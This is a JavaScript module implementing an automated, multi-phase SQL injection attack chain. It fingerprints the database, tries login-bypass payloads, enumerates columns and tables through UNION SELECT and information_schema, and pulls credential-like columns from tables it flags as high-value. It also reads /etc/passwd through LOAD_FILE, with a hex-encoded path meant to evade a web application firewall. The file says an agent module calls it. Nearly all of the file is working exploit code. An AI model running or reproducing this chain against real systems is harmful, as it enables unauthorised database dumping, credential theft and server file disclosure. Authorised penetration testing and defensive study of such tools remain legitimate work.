/**
 * sqliAttackChain.js — Progressive SQL Injection Attack Chain
 *
 * Implements the textbook methodology for SQL injection exploitation:
 *   Phase 0: Error-based fingerprinting (probe for DB type)
 *   Phase 1: Auth bypass (for login forms)
 *   Phase 2: ORDER BY column count enumeration
 *   Phase 3: UNION SELECT NULL column reflection probe
 *   Phase 4: DB fingerprint (user, database, version)
 *   Phase 5: information_schema → tables → columns → data extraction
 *   Phase 6: Privilege check (FILE privilege → LOAD_FILE attempt)
 *
 * Used by unifiedEngine.js and reactAgent.js for systematic SQLi exploitation.
 *
 * Exported API:
 *   runSqliChain({ url, method, param, injectIn, httpClient, onProgress })
 *   → { dbType, columnCount, reflectiveColumn, extractedData, privilegeLevel, phaseReached }
 */

import crypto from 'crypto';

// ── Per-DB time-based payloads ────────────────────────────────────────────────

const TIME_PAYLOADS = {
    mysql: "' AND SLEEP(5)-- -",
    mssql: "'; WAITFOR DELAY '0:0:5'--",
    postgres: "'; SELECT pg_sleep(5)--",
    oracle: "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('X',5) FROM dual--",
    sqlite: "1; SELECT randomblob(150000000)--",
};

// ── DB-specific UNION extraction templates ────────────────────────────────────

const UNION_TEMPLATES = {
    mysql: {
        version: (n, col) => buildUnion(n, col, 'version()'),
        user: (n, col) => buildUnion(n, col, 'user()'),
        database: (n, col) => buildUnion(n, col, 'database()'),
        tables: (n, col, db) => buildUnion(n, col, `GROUP_CONCAT(table_name SEPARATOR ',')`, `information_schema.tables WHERE table_schema='${db || 'database()'}'`).replace("'database()'", 'database()'),
        columns: (n, col, tbl) => buildUnion(n, col, `GROUP_CONCAT(column_name SEPARATOR ',')`, `information_schema.columns WHERE table_name='${tbl}'`),
        data: (n, col, tbl, cols) => buildUnion(n, col, `GROUP_CONCAT(${cols.map(c => `${c}`).join(",0x3a,")})`, tbl),
        privs: (n, col) => buildUnion(n, col, `GROUP_CONCAT(privilege_type)`, 'INFORMATION_SCHEMA.USER_PRIVILEGES'),
        loadFile: (n, col, path) => buildUnion(n, col, `load_file('${path}')`),
    },
    postgres: {
        version: (n, col) => buildUnion(n, col, 'version()'),
        user: (n, col) => buildUnion(n, col, 'current_user'),
        database: (n, col) => buildUnion(n, col, 'current_database()'),
        tables: (n, col) => buildUnion(n, col, `STRING_AGG(table_name,',')`, `information_schema.tables WHERE table_schema='public'`),
        columns: (n, col, tbl) => buildUnion(n, col, `STRING_AGG(column_name,',')`, `information_schema.columns WHERE table_name='${tbl}'`),
        data: (n, col, tbl, cols) => buildUnion(n, col, `STRING_AGG(${cols.map(c => `CAST(${c} AS TEXT)`).join("||':'||")},',')`, tbl),
        privs: () => null, // not applicable
        loadFile: () => null, // postgres uses pg_read_file
    },
    mssql: {
        version: (n, col) => buildUnion(n, col, '@@version'),
        user: (n, col) => buildUnion(n, col, 'system_user'),
        database: (n, col) => buildUnion(n, col, 'DB_NAME()'),
        tables: (n, col) => buildUnion(n, col, `(SELECT STRING_AGG(table_name,',') FROM information_schema.tables)`),
        columns: (n, col, tbl) => buildUnion(n, col, `(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='${tbl}')`),
        data: (n, col, tbl, cols) => buildUnion(n, col, `(SELECT STRING_AGG(${cols[0]}+':'+${cols[1] || cols[0]},',') FROM ${tbl})`),
        privs: () => null,
        loadFile: () => null,
    },
    generic: {
        version: (n, col) => buildUnion(n, col, 'version()'),
        user: (n, col) => buildUnion(n, col, 'user()'),
        database: (n, col) => buildUnion(n, col, 'database()'),
        tables: (n, col) => buildUnion(n, col, `group_concat(table_name)`, `information_schema.tables`),
        columns: (n, col, tbl) => buildUnion(n, col, `group_concat(column_name)`, `information_schema.columns WHERE table_name='${tbl}'`),
        data: (n, col, tbl, cols) => buildUnion(n, col, `group_concat(${cols.join(",0x3a,")})`, tbl),
        privs: (n, col) => buildUnion(n, col, `group_concat(privilege_type)`, 'INFORMATION_SCHEMA.USER_PRIVILEGES'),
        loadFile: (n, col, path) => buildUnion(n, col, `load_file('${path}')`),
    },
};

// ── Helper: build UNION SELECT payload with N columns ────────────────────────

function buildUnion(columnCount, reflectiveCol, expr, fromClause = null) {
    const cols = [];
    for (let i = 1; i <= columnCount; i++) {
        cols.push(i === reflectiveCol ? expr : 'NULL');
    }
    const from = fromClause ? ` FROM ${fromClause}` : '';
    return `-1 UNION SELECT ${cols.join(',')}${from}-- -`;
}

// ── Helper: inject a payload and get the response ────────────────────────────

async function inject(httpClient, url, method, param, injectIn, payload) {
    const start = Date.now();
    try {
        let response;
        if (injectIn === 'body' || method.toUpperCase() === 'POST') {
            response = await httpClient.post(url, { [param]: payload }, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            });
        } else {
            const u = new URL(url.startsWith('http') ? url : `https://${url}`);
            u.searchParams.set(param, payload);
            response = await httpClient.get(u.toString());
        }
        return {
            body: response.data?.toString() || '',
            status: response.status,
            elapsed: Date.now() - start,
        };
    } catch (err) {
        return {
            body: err.response?.data?.toString() || '',
            status: err.response?.status || 0,
            elapsed: Date.now() - start,
            error: err.message,
        };
    }
}

// ── DB type detector ─────────────────────────────────────────────────────────

function detectDbType(body) {
    if (/MySQL|mysql_fetch|You have an error in your SQL syntax/i.test(body)) return 'mysql';
    if (/PostgreSQL|pg_query|syntax error at or near/i.test(body)) return 'postgres';
    if (/Microsoft.*ODBC|SqlException|Unclosed quotation/i.test(body)) return 'mssql';
    if (/ORA-\d{5}|oracle\.jdbc/i.test(body)) return 'oracle';
    if (/sqlite3?\.|\bSQLITE_ERROR\b/i.test(body)) return 'sqlite';
    return 'generic';
}

// ── Phase 2: ORDER BY column count enumeration ────────────────────────────────

async function enumerateColumnCount(httpClient, url, method, param, injectIn, maxCols = 10) {
    for (let n = 1; n <= maxCols; n++) {
        const payload = `' ORDER BY ${n}-- -`;
        const r = await inject(httpClient, url, method, param, injectIn, payload);
        // If we get an error about "unknown column N" → we exceeded the column count
        if (/unknown column|Column .*? does not exist|ORDER BY.*?ORA-/i.test(r.body) ||
            r.status === 500 && n > 1) {
            return n - 1; // last successful N
        }
    }
    return 3; // fallback assumption
}

// ── Phase 3: Find reflective column ─────────────────────────────────────────

async function findReflectiveColumn(httpClient, url, method, param, injectIn, columnCount) {
    const marker = `rv${crypto.randomBytes(3).toString('hex')}`;
    for (let col = 1; col <= columnCount; col++) {
        const cols = [];
        for (let i = 1; i <= columnCount; i++) {
            cols.push(i === col ? `'${marker}'` : 'NULL');
        }
        const payload = `-1 UNION SELECT ${cols.join(',')}-- -`;
        const r = await inject(httpClient, url, method, param, injectIn, payload);
        if (r.body.includes(marker)) {
            return { col, marker };
        }
    }
    return { col: 2, marker }; // fallback to column 2
}

// ── Main exported function ────────────────────────────────────────────────────

/**
 * Run the full progressive SQL injection attack chain.
 *
 * @param {object} opts
 * @param {string}   opts.url         - Target URL
 * @param {string}   opts.method      - GET | POST
 * @param {string}   opts.param       - Injectable parameter name
 * @param {string}   opts.injectIn    - 'query' | 'body'
 * @param {object}   opts.httpClient  - axios instance or compatible
 * @param {Function} [opts.onProgress] - SSE progress callback
 * @param {boolean}  [opts.skipRce]   - If true, skip file-read phase (default false)
 *
 * @returns {Promise<{
 *   dbType: string,
 *   columnCount: number,
 *   reflectiveColumn: number,
 *   phaseReached: number,
 *   extractedData: object,
 *   privilegeLevel: string[],
 *   hasFilePrivilege: boolean,
 *   evidence: string[],
 * }>}
 */
export async function runSqliChain({ url, method, param, injectIn, httpClient, onProgress = () => { }, skipRce = false }) {
    const result = {
        dbType: 'generic',
        columnCount: 3,
        reflectiveColumn: 2,
        phaseReached: 0,
        extractedData: {},
        privilegeLevel: [],
        hasFilePrivilege: false,
        evidence: [],
    };

    const log = (msg) => {
        onProgress({ phase: 'sqli_chain', status: 'running', message: msg });
        result.evidence.push(msg);
    };

    // ── Phase 0: Error probe + DB fingerprint ──────────────────────────────────
    log(`🔬 SQLi Chain Phase 0: Error probe on ${url} [${param}]`);
    const probe = await inject(httpClient, url, method, param, injectIn, "'");
    result.dbType = detectDbType(probe.body);
    result.phaseReached = 0;
    if (result.dbType !== 'generic') {
        log(`✅ DB type detected: ${result.dbType}`);
    }
    const tmpl = UNION_TEMPLATES[result.dbType] || UNION_TEMPLATES.generic;

    // ── Phase 1: Auth bypass (only for POST login forms) ──────────────────────
    if (method.toUpperCase() === 'POST') {
        log(`🔑 Phase 1: Testing auth bypass payloads...`);
        const bypassPayloads = ["' OR 1=1--", "' OR '1'='1", "admin'--", "' OR 1=1#"];
        for (const p of bypassPayloads) {
            const r = await inject(httpClient, url, method, param, injectIn, p);
            if (r.status === 200 && !/login|error|invalid|denied/i.test(r.body)) {
                log(`🚨 Auth bypass succeeded with: ${p}`);
                result.extractedData.authBypass = p;
                break;
            }
        }
        result.phaseReached = 1;
    }

    // ── Phase 2: Column count via ORDER BY ────────────────────────────────────
    log(`🔢 Phase 2: Enumerating column count via ORDER BY...`);
    result.columnCount = await enumerateColumnCount(httpClient, url, method, param, injectIn);
    log(`📊 Column count: ${result.columnCount}`);
    result.phaseReached = 2;

    // ── Phase 3: Find reflective column ──────────────────────────────────────
    log(`🔍 Phase 3: Finding reflective column...`);
    const { col } = await findReflectiveColumn(httpClient, url, method, param, injectIn, result.columnCount);
    result.reflectiveColumn = col;
    log(`✅ Reflective column: ${col} of ${result.columnCount}`);
    result.phaseReached = 3;

    const n = result.columnCount;
    const c = result.reflectiveColumn;

    // ── Phase 4: DB fingerprint ───────────────────────────────────────────────
    log(`🔎 Phase 4: Fingerprinting DB (user, database, version)...`);
    try {
        // Try combined extraction first
        const combined = buildUnion(n, c, 'CONCAT(user(),0x7c,database(),0x7c,version())', null);
        const r4 = await inject(httpClient, url, method, param, injectIn, combined);
        const match = r4.body.match(/([^|<>\s]{1,50})\|([^|<>\s]{1,50})\|([^|<>\s]{1,80})/);
        if (match) {
            result.extractedData.user = match[1];
            result.extractedData.database = match[2];
            result.extractedData.version = match[3];
            log(`✅ Fingerprint: user=${match[1]} db=${match[2]} version=${match[3]}`);
        } else {
            // Separate queries
            const rUser = await inject(httpClient, url, method, param, injectIn, tmpl.user(n, c));
            const rDb = await inject(httpClient, url, method, param, injectIn, tmpl.database(n, c));
            result.extractedData.userResponse = rUser.body.slice(0, 500);
            result.extractedData.dbResponse = rDb.body.slice(0, 500);
            log(`📋 User/DB responses captured`);
        }
    } catch (e) {
        log(`⚠️ Phase 4 partial failure: ${e.message}`);
    }
    result.phaseReached = 4;

    // ── Phase 5: Table enumeration ────────────────────────────────────────────
    log(`📚 Phase 5: Enumerating tables from information_schema...`);
    try {
        const dbName = result.extractedData.database || null;
        const rTables = await inject(httpClient, url, method, param, injectIn, tmpl.tables(n, c, dbName));
        // Extract table list from response
        const bodySlice = rTables.body.slice(0, 2000);
        const tableMatch = bodySlice.match(/([a-zA-Z0-9_,]{3,500})/g);
        if (tableMatch && tableMatch.length > 0) {
            // Find the longest CSV-like match (likely our table list)
            const tableList = tableMatch.sort((a, b) => b.split(',').length - a.split(',').length)[0];
            const tables = tableList.split(',').filter(t => /^[a-zA-Z0-9_]+$/.test(t) && t.length > 1);
            result.extractedData.tables = tables.slice(0, 20);
            log(`✅ Tables found: ${tables.slice(0, 10).join(', ')}`);

            // Look for high-value tables
            const highValueTables = tables.filter(t =>
                /user|account|admin|member|customer|credential|password|auth/i.test(t)
            );

            if (highValueTables.length > 0) {
                log(`🎯 High-value tables: ${highValueTables.join(', ')}`);
                // Enumerate columns from first high-value table
                const targetTable = highValueTables[0];
                const rCols = await inject(httpClient, url, method, param, injectIn, tmpl.columns(n, c, targetTable));
                const colSlice = rCols.body.slice(0, 1000);
                const colMatch = colSlice.match(/([a-zA-Z0-9_,]{3,300})/g);
                if (colMatch) {
                    const colList = colMatch.sort((a, b) => b.split(',').length - a.split(',').length)[0];
                    const cols = colList.split(',').filter(col => /^[a-zA-Z0-9_]+$/.test(col) && col.length > 1);
                    result.extractedData.columns = { [targetTable]: cols };
                    log(`✅ Columns in ${targetTable}: ${cols.slice(0, 10).join(', ')}`);

                    // Extract credential columns
                    const credCols = cols.filter(col =>
                        /user|email|name|pass|pwd|hash|token/i.test(col)
                    ).slice(0, 3);

                    if (credCols.length >= 2) {
                        const rData = await inject(httpClient, url, method, param, injectIn,
                            tmpl.data(n, c, targetTable, credCols)
                        );
                        result.extractedData.sample = rData.body.slice(0, 1000);
                        log(`✅ Data sample extracted from ${targetTable} (${credCols.join(', ')})`);
                    }
                }
            }
        }
    } catch (e) {
        log(`⚠️ Phase 5 partial failure: ${e.message}`);
    }
    result.phaseReached = 5;

    // ── Phase 6: Privilege check + file read attempt ──────────────────────────
    if (!skipRce && tmpl.privs) {
        log(`🔐 Phase 6: Checking DB user privileges...`);
        try {
            const privPayload = tmpl.privs(n, c);
            if (privPayload) {
                const rPrivs = await inject(httpClient, url, method, param, injectIn, privPayload);
                const privText = rPrivs.body.slice(0, 500);
                result.privilegeLevel = extractPrivileges(privText);
                result.hasFilePrivilege = result.privilegeLevel.some(p => /file/i.test(p));
                log(`✅ Privileges: ${result.privilegeLevel.join(', ') || '(none detected)'}`);

                if (result.hasFilePrivilege && tmpl.loadFile) {
                    log(`📂 FILE privilege confirmed — attempting LOAD_FILE('/etc/passwd')...`);
                    const filePayload = tmpl.loadFile(n, c, '/etc/passwd');
                    const rFile = await inject(httpClient, url, method, param, injectIn, filePayload);
                    if (/root:|daemon:|nobody:/i.test(rFile.body)) {
                        result.extractedData.etcPasswd = rFile.body.slice(0, 1000);
                        log(`🚨 /etc/passwd read successfully!`);
                    } else {
                        // Try hex path as WAF bypass
                        const hexPayload = tmpl.loadFile(n, c, null).replace("'null'",
                            '0x2f6574632f706173737764');
                        const rHex = await inject(httpClient, url, method, param, injectIn, hexPayload);
                        if (/root:|daemon:|nobody:/i.test(rHex.body)) {
                            result.extractedData.etcPasswd = rHex.body.slice(0, 1000);
                            log(`🚨 /etc/passwd read via hex path!`);
                        }
                    }
                }
            }
        } catch (e) {
            log(`⚠️ Phase 6 partial failure: ${e.message}`);
        }
    }
    result.phaseReached = 6;

    log(`✅ SQLi chain complete. Phase reached: ${result.phaseReached}`);
    return result;
}

// ── Privilege string extractor ────────────────────────────────────────────────

function extractPrivileges(body) {
    const known = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'CREATE', 'DROP', 'ALTER',
        'INDEX', 'FILE', 'REFERENCES', 'RELOAD', 'SHUTDOWN', 'PROCESS',
        'ALL PRIVILEGES', 'SUPER', 'GRANT OPTION'];
    return known.filter(p => body.toUpperCase().includes(p));
}
